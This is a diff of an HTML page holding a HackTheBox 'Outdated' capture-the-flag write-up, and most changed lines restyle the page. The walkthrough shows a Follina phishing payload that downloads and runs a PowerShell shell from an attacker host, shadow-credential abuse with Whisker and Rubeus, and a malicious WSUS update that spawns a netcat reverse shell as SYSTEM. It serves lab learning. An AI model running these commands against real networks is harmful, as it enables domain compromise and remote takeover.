@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html id="doc" class="">
 <div id="particles-js">
 <head>
     <meta charset="UTF-8">
@@ -16,13 +16,22 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script src="/Scripts/js/particles.js"></script>
     <script src="/Scripts/js/app.js"></script>
-<title>Outdated HackTheBox Writeup | 0xv01d</title>
-<meta property="og:locale" content="en_US">
-<script type="application/ld+json">
-</script>
+    <title>Outdated HackTheBox Writeup | 0xv01d</title>
+    <meta property="og:locale" content="en_US">
+    <script type="application/ld+json">
+    </script>
 
-    <link rel="stylesheet" href="/Styles/style.css?v=">
+  <link rel="stylesheet" href="/Styles/style.css?v=">
 	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <!-- Bootstrap CSS -->
+    <!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>-->
+	<link rel="stylesheet" href="/Styles/style_darkwing.css">
+	<link rel="stylesheet" href="/Styles/footer.css">
+  <script src="/Scripts/js/bar.js"></script>
+
+
 <!-- Setup Google Analytics -->
 
 	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/outdated/favicon.ico">
@@ -31,33 +40,130 @@
 
   </head>
   <body>
-      <header class="app-header">
-        <a href="https:0xv01d.github.io">
-          <img class="avatar" src="/images/index/avatar.png">
-		</a><p></p>
-		<h1><strong>0xv01d</strong></h1>
-		<nav class="app-header-menu">
-			<a class="app-header-menu-item" href="/">Home</a>
-             - 
-			<a class="app-header-menu-item" href="/tags/">Tags</a>
-             - 
-			<a class="app-header-menu-item" href="/about/">About</a>
-		</nav>
-		<p>Just another computer adict.</p>
-		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
-			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
-			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
-			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
-			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
-		</div>
-        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
-			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
-        </a>
-        <div style="height: 7rem;"></div>
-      </header>
 
-      <main class="app-container">
-		
+
+        <aside id="menu" class="hide">
+            <div class="inner flex-row-vertical">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+                    <i class="icon icon-lg icon-times-circle"></i>
+                    <!--        <i class="icon icon-lg icon-close"></i>-->
+                </a>
+                <div class="brand-wrap avatar-wrapper">
+                    <!--    <div class="brand-wrap avatar-wrapper" style="background-image:url(/images/index/avatar.png);"> -->
+                    <a href="https:0xv01d.github.io">
+                        <img class="avatar shake" src="/images/index/avatar.png">
+
+                    </a>
+                    <p></p>
+                    <h1 class="tubelight"><strong>0xv01d</strong></h1>
+                </div>
+
+                <div class="scroll-wrap flex-col">
+                    <ul class="nav">
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/">
+                                <i class="icon icon-lg icon-home"></i>
+                                Home
+                            </a>
+                        </li>
+<!--
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-archives"></i>
+                                Archives
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-tags"></i>
+                                Tags
+                            </a>
+                        </li>
+-->
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://github.com/0xv01d" target="_blank">
+                                <i class="icon icon-lg icon-github"></i>
+                                Github
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://infosec-0xv01d.medium.com/" target="_blank">
+                                <i class="icon_new fa-brands fa-medium"></i>
+                                <!--                <i class="icon icon-lg icon-medium"></i>-->
+                                Medium
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.youtube.com/@0xv01d_infosec" target="_blank">
+                                <i class="icon_new fa-brands fa-youtube"></i>
+                                Youtube
+                            </a>
+                        </li>
+                        
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#" target="_blank">
+                                <i class="icon_new fa-brands fa-twitch"></i>
+                                Twitch
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.linkedin.com/in/isaac-david-g-7bb187318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
+                                <i class="icon_new fa-brands fa-linkedin"></i>
+                                Linkedin
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/about">
+                                <i class="icon icon-lg icon-link"></i>
+                                About
+                            </a>
+                        </li>
+                    </ul>
+                    <a style="padding-left: 0.7rem; padding-top: 3rem;"
+                        href="https://app.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+                        <img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+                    </a>
+                </div>
+            </div>
+        </aside>
+      <main id="main">
+<!--        class="app-container"> -->
+<div class="fixed-top" id="message"></div>
+      <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" style="padding-right: 0.4rem;">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis" style="visibility: visible;">Outdated - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="fa-solid fa-language"></i>
+<!--                <i class="icon icon-lg icon-language"></i>-->
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+
+      </header>
+      
+  <div class="container body-wrap">
+
 		<article class="post">		
 			<header class="post-header">
 
@@ -93,7 +199,8 @@
 			Then we're going to exploit shadow credentials to move laterally to the next user. Finally we'are going to inject a malicious update to <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus" rel="nonreferrer noopener" target="_blank">WSUS</a> and getting a shell as nt authority system.
 
 <!--Machine Resolution-->
-			<h1 id="header-1">Recon</h1>
+<h1 id="reconnaissance" class="toc-add toc-title">Reconnaissance</h1>
+<h2 id="port_scan" class="toc-add">Port-Scan</h2>
 
   	          <p class="head-img">As always let's start with a portscan, we have many ports open, and we can realize that we are facing an DC, we have a lot to start with, but first let's save the domains reported by nmap, outdated.htb and mail.outdated.htb in the /etc/hosts</p>
             <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap1.png">
@@ -104,9 +211,10 @@
             <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap6.png">
             <img class="img-post" style="max-width: 1262px;" src="/images/HTB/outdated/nmap7.png">
 
-
+<h2 id="enum4linux" class="toc-add">enum4linux</h2>
 			<p class="head-img">As we can see, we can connect via smb using a NULL session, and also we get the domain SID</p>
-		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight">
+      <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> enum4linux</span> outdated.htb
 <------------------------------------->
  ===================================== 
@@ -127,8 +235,10 @@ Domain Sid: S-1-5-21-4089647348-67660539-4016542185
 <-------------------------------------->
 </span>	</code></pre></div></div>
 
+<h2 id="smb_enum" class="toc-add">SMB Enumeration</h2>
             <p class="head-img">Listing the smb shares we find a pdf</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> smbclient</span> -N \\\\outdated.htb\\Shares
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -142,11 +252,17 @@ getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (43.8 KiloByte
 smb: \> quit
 </span> </code></pre></div></div>
 
+<h1 id="foothold" class="toc-add toc-title" style="margin-top: 2.5rem;">Foothold</h1>
+
 			<p class="head-img">We find a valid email and a list of CVEs, one of them corresponds to <a href="https://github.com/chvancooten/follina.py" rel="noreferrer noopener" target="_blank">follina</a>, and since smtp is open we can test this vector</p>
             <img class="img-post" style="max-width: 877px;" src="/images/HTB/outdated/pdf_smb.png"></img>
 
+
+<h2 id="exploiting_follina" class="toc-add">Exploiting Follina</h2>
+
             <p class="head-img">Let's run the follina.py that will create a server with our payload which will create a Net.WebClient object to download the shell as a string and execute it as a Powershell command, let's download it and save it as index.html, so we can mount a new server and wait for the shell request</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">sudo python3</span> follina.py -m command -t rtf -c <span class="k">"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.42/shell.ps1')"</span>
 [sudo] password for 0xv01d:
 Generated 'clickme.rtf' in current directory
@@ -158,7 +274,8 @@ Serving payload on http://localhost:80/exploit.html
 </span> </code></pre></div></div>
 
             <p class="head-img">So, now let's mount the server where the index.html and the <a href="https://github.com/antonioCoco/ConPtyShell" rel="noreferrer noopener" target="_blank">shell</a> are placed, and then send the email to itsupport, remember to set the listener before</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">sudo python3</span> -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.175 - - [14/Oct/2022 22:32:41] "GET / HTTP/1.1" 200 -
@@ -207,23 +324,12 @@ Try the new cross-platform PowerShell https://aka.ms/pscore6
 <span class="k">PS C:\Users\btables\AppData\Local\Temp\SDIAG_a75c5a63-f148-4b64-9b5b-b6a81cfe0db5></span>
 </span> </code></pre></div></div>
 
-            <p class="head-img">Digging a bit we find out that we're in a vm</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="ld"><span class="k">PS C:\> SystemInfo</span>
-<.............................................>
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: Microsoft Hyper-V Network Adapter
-                                 Connection Name: Ethernet
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 172.16.20.20
-Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
-<.............................................>
-</span> </code></pre></div></div>
-
+<h1 id="initial_access" class="toc-add toc-title" style="margin-top: 2.5rem;">Initial Access</h1>
+<h2 id="bloodhound_enumeration" class="toc-add">BloodHound Enumeration</h2>
 
             <p class="head-img">Let's upload <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpHound.exe" rel="nonreferrer noopener" target="_blank">SharpHound</a> to enumerate a bit</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="k">PS C:\programdata></span> curl http://10.10.16.41/SharpHound.exe -o SharpHound.exe
 <span class="k">PS C:\programdata></span> .\SharpHound.exe -c all
 <.............................................>
@@ -232,7 +338,8 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 
 
             <p class="head-img">Now let's transfer the results via smb</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="k">PS C:\programdata></span> copy 20221226212452_BloodHound.zip \\10.10.16.42\share\
 
 <span class="na">❯ </span><span class="kt">sudo impacket-smbserver </span>-smb2support share $(<span class="kt">pwd</span>)
@@ -262,8 +369,11 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
             <p class="head-img">Once we upload the zip to <a href="https://github.com/BloodHoundAD/BloodHound"  rel="nonreferrer noopener" target="_blank">bloodhound</a>, we can notice that there is an AddKeyCredentialLink that we can abuse, which means that we can create shadow credentials and authenticate using kerberos</p>
             <img class="img-post" style="max-width: 660px;" src="/images/HTB/outdated/bloodhound.png"></img>
 
+<h2 id="user_pivoting" class="toc-add">User Pivoting</h2>
+<h3 id="abusing_AddKeyCredentialLink" class="toc-add" style="margin-top: 2rem;">Abusing AddKeyCredentialLink</h3>
             <p class="head-img">For this we'll use <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1" rel="noreferrer noopener" target="_blank">whisker</a>, let's upload it, and run it, once we did it we'll get a certificate</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="k">PS C:\programdata> </span>IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.41/Invoke-Whisker.ps1')
 <span class="k">PS C:\programdata> </span>Invoke-Whisker -command "add /target:sflowers /path:C:\programdata\mycert.cer"
 [*] No pass was provided. The certificate will be stored with the password gAakqxmBDc29KC0N
@@ -283,7 +393,8 @@ Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /passwor
 </span> </code></pre></div></div>
 
             <p class="head-img">Now let's upload <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe" rel="noreferrer noopener" target="_blank">Rubeus</a> to the box, and execute it passing it the cert</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="k">PS C:\programdata> </span>curl http://10.10.16.41/Rubeus.exe -o Rubeus.exe
 <span class="k">PS C:\programdata> </span>.\Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /password:"gAakqxmBDc29KC0N" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
 
@@ -331,8 +442,10 @@ Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /passwor
 <span class="k">PS C:\programdata></span>
 </span> </code></pre></div></div>
 
+<h1 id="sflowers_WinRM_Connection" class="toc-add toc-title" style="margin-top: 2.5rem;">Sflowers WinRM Access</h1>
             <p class="head-img">Now let's connect us via winrm using the NT hash</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">evil-winrm</span> -i 10.10.11.175 -u sflowers@outdated.htb -H <span class="k">'1FCDB1F6015DCB318CC77BB2BDA14DB5'</span>
 
 <span class="x">Evil-WinRM shell v3.4</span>
@@ -349,8 +462,12 @@ Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /passwor
 <span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\Users\sflowers\Documents>
 </span> </code></pre></div></div>
 
+<h1 id="PrivEsc" class="toc-add toc-title" style="margin-top: 2.5rem;">Privilege Escalation</h1>
+<h2 id="WSUS_Exploitation" class="toc-add">WSUS Exploitation</h2>
+
             <p class="head-img">After digging a bit we find out that as the endpoint of WSUS is http and we're member of the administrator group, we can easily inject an update, for this task we'll use <a href="https://github.com/nettitude/SharpWSUS" rel="noreferrer noopener" target="_blank">SharpWSUS</a> (you need to compile it and sign it in order to run it on the machine), and also we need to upload <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" rel="noreferrer noopener" target="_blank">psexec</a></p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> upload SharpWSUS.exe
 <span class="x">Info: Uploading SharpWSUS.exe to C:\programdata\SharpWSUS.exe</span>
 
@@ -370,8 +487,10 @@ Rubeus.exe asktgt /user:sflowers /certificate:C:\programdata\mycert.cer /passwor
 <span class="x">Info: Upload successful!</span>
 </span> </code></pre></div></div>
 
+<h3 id="Creating_Malicious_Update" class="toc-add" style="margin-top: 2rem;">Creating Malicious Update</h3>
             <p class="head-img">Now let's upload netcat and create the update to get a reverse shell as nt authority system</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> upload nc.exe
 <span class="x">Info: Uploading nc.exe to C:\programdata\nc.exe</span>
 
@@ -424,8 +543,10 @@ DeploymentRevision
 [*] Create complete
 </span> </code></pre></div></div>
 
+<h3 id="Approving_Update" class="toc-add" style="margin-top: 2rem;">Approving Update</h3>
             <p class="head-img">Now let's approve it</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="gd">*Evil-WinRM*</span> <span class="k">PS</span> C:\programdata> .\SharpWSUS.exe approve /updateid:27407865-ea93-4263-925d-499c0ae7ab50 /computername:DC.outdated.htb /groupname:"RevShell"
 
  ____  _                   __        ______  _   _ ____
@@ -449,9 +570,10 @@ Approved Update
 
 [*] Approve complete
 </span> </code></pre></div></div>
-
+<h3 id="Getting_NT_Authority_Shell" class="toc-add" style="margin-top: 2rem;">Getting NT Authority Shell</h3>
             <p class="head-img">If the update has been installed correctly we should get a shell, and we can read the final flag, by other way, we could check the update state and try it again</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯ </span><span class="ld"><span class="kt">rlwrap sudo</span> nc -nlvp 9001
 listening on [any] 9001 ...
 connect to [10.10.16.42] from (UNKNOWN) [10.10.11.175] 49827
@@ -486,9 +608,185 @@ DC.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
 [*] Check complete
 </span> </code></pre></div></div>
 
-<a href="#">Go back</a>
 		</article>
+
+<aside class="post-widget">
+   <nav class="post-toc-wrap fixed" id="post-toc">
+      <h4>Table of contents</h4>
+      <ol class="post-toc">
+      </ol>
+   </nav>
+</aside>
+
+<a href="https://www.buymeacoffee.com/0xv01d" target="_blank" style="margin-top: 1rem;"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
+    </div>
+<article id="wrap">
+	<article id="lightings">
+    	<section id="one">
+            <section id="two">
+                <section id="three">
+                    <section id="four">
+                        <section id="five">
+                            
+                        </section>
+                    </section>
+                </section>
+            </section>
+		</section>
+    </article>
+</article>
+
+    <footer class="footer">
+    <div class="bottom">
+        <p><span>0xv01d © 2022 - 2024</span>
+        </p>
+    </div>
+</footer> 
       </main>
+      <div id="mask" class="mask"></div>
+<a href="#" id="gotop" class="waves-effect waves-circle waves-light in"><span class="icon icon-lg icon-chevron-up"></span></a>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var gotopButton = document.getElementById("gotop");
+
+            // Show/hide the button based on scroll position
+            window.addEventListener("scroll", function () {
+                if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                    gotopButton.style.opacity = "1";
+                } else {
+                    gotopButton.style.opacity = "0";
+                }
+            });
+
+            // Smooth scroll to top when the button is clicked
+            gotopButton.addEventListener("click", function (event) {
+                event.preventDefault();
+
+                // Use the scrollIntoView method with behavior: 'smooth'
+                document.body.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
+        });
+
+    </script>
+    <script>
+        function copyToClipboard(button) {
+            // Find the nearest .highlight parent of the clicked button
+            const codeElement = button.closest('.highlight');
+
+            if (codeElement) {
+                // Clone the code element to exclude the button
+                const codeClone = codeElement.cloneNode(true);
+
+                // Remove the button from the clone
+                const buttons = codeClone.querySelectorAll('.copy-btn');
+                buttons.forEach((btn) => btn.remove());
+
+                const codeText = codeClone.innerText;
+
+                // Create a temporary textarea element to copy the text
+                const textarea = document.createElement('textarea');
+                textarea.value = codeText;
+                document.body.appendChild(textarea);
+
+                // Select and copy the text
+                textarea.select();
+                document.execCommand('copy');
+
+                // Remove the temporary textarea
+                document.body.removeChild(textarea);
+
+                // Change the icon in the button to "fa-check"
+                const iconElement = button.querySelector('i');
+                if (iconElement) {
+                  iconElement.classList.remove('fa-clipboard');
+                  iconElement.classList.add('fa-check', 'green-icon');
+                }
+
+                // Temporarily change the icon back to "fa-clipboard" after 2000 milliseconds (2 seconds)
+                setTimeout(() => {
+                  if (iconElement) {
+                    iconElement.classList.remove('fa-check', 'green-icon');
+                    iconElement.classList.add('fa-clipboard');
+                  }
+                }, 2000);
+            } else {
+                console.error('Unable to find the code element');
+            }
+        }
+    </script>
+
+
+    <script>
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+        menu.classList.toggle('hide');
+    });
+
+    document.getElementById('menu-off').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Agregar la clase 'hide' para ocultar el menú
+        menu.classList.add('hide');
+    });
+</script>
+
+<script>
+    function lock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.toggle('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.remove('hide')
+            menu.classList.toggle('show')
+            mask.classList.add('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+        }
+    }
+
+    function unlock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.remove('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.toggle('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+            menu.classList.add('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        }
+    }
+
+    // Llamar a la función al cargar la página y cuando se redimensiona la ventana
+//    window.addEventListener('load', lock);
+//    window.addEventListener('resize', unlock);
+
+    // Añadir el evento click al botón de menú
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        lock();  // Actualizar visibilidad del menú al hacer clic en el botón
+    });
+
+    // Añadir el evento click al botón de ocultar menú
+    document.getElementById('menu-off').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+    
+    document.getElementById('mask').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+</script>
+
+
   </body>
 </div>
 </html>
